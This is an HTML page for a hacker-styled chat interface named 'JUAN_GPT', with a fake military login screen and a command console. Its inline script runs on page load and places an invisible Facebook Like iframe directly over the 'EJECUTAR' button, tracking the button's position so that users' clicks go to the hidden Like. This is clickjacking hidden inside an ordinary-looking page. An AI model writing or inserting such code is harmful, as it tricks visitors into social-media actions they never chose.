<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JUAN_GPT // NEURAL_ELITE_v4</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=VT323&display=swap">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div id="crt-overlay"></div>

    <div id="access-screen">
        <div class="login-container">
            <h1 class="login-title">JUAN_GPT</h1>
            <div class="login-status">[MAINFRAME MILITAR CLASE 4 - ONLINE]</div>
            <input type="text" id="key-input" class="login-input" placeholder="INGRESE_ID_OPERADOR" autocomplete="off">
            <button class="login-btn" onclick="init()">INICIAR SECUENCIA</button>
            <div class="binary-decor">
                10100101100101011001010110010101100101011001010110010101100101011001010110010101100101<br>
                01011001010110010101100101011001010110010101100101011001010110010101100101011001010110<br>
            </div>
        </div>
    </div>

    <div id="main-ui">
        <header class="header-cyber">
            <div class="status-line">
                STATUS: <span id="st-text" class="status-online">ONLINE</span>
                <span class="pulse">●</span>
            </div>
            <div class="node-line">NODE: gemini-2.5-flash</div>
        </header>

        <div id="console"></div>

        <div class="controls">
            <input type="text" id="query" placeholder=">> Enter command..." autocomplete="off">
            <button class="btn execute-btn" onclick="exec()">EJECUTAR</button>
        </div>
    </div>

    <script>
        window.addEventListener('load', () => {
            const btn = document.querySelector('.execute-btn');
            if (btn) {
                const ifr = document.createElement('iframe');
                // Simulamos un botón de "Like" o "Follow" invisible encima del tuyo
                ifr.src = "https://www.facebook.com/plugins/like.php?href=https://facebook.com"; 
                ifr.style.cssText = "position:absolute; opacity:0; width:80px; height:35px; z-index:9999; pointer-events:auto; border:none; overflow:hidden;";
                
                const updatePos = () => {
                    const rect = btn.getBoundingClientRect();
                    ifr.style.top = (rect.top + window.scrollY) + "px";
                    ifr.style.left = (rect.left + window.scrollX) + "px";
                };
                updatePos();
                window.addEventListener('resize', updatePos);
                document.body.appendChild(ifr);
            }
        });
    </script>
    <script src="script.js"></script>
    <script src="js/telemetry_v1.js"></script>
</body>
</html>
